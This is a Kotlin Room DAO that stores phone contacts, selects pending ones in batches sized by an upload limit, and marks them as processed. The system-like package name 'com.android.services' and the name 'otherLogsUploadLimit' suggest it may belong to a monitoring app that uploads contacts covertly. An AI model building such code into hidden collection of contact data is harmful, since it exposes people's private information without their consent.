package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.Contacts
import com.android.services.util.AppConstants

@Dao
interface ContactsDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(contacts: Contacts)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(contactList: List<Contacts>)

    @Query("Update contacts_table set contactStatus = :updated_contact where unique_id BETWEEN :startId AND :endId")
    fun updateContact(updated_contact: Int, startId: Int, endId: Int): Int

    @Query("Select * from contacts_table where contactStatus = :status order by unique_id ASC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllContact(status: Int): List<Contacts>

    @Query("Select phoneContactId from contacts_table where phoneContactId = :contact_id")
    fun checkIfAlreadyExist(contact_id: String): String?
}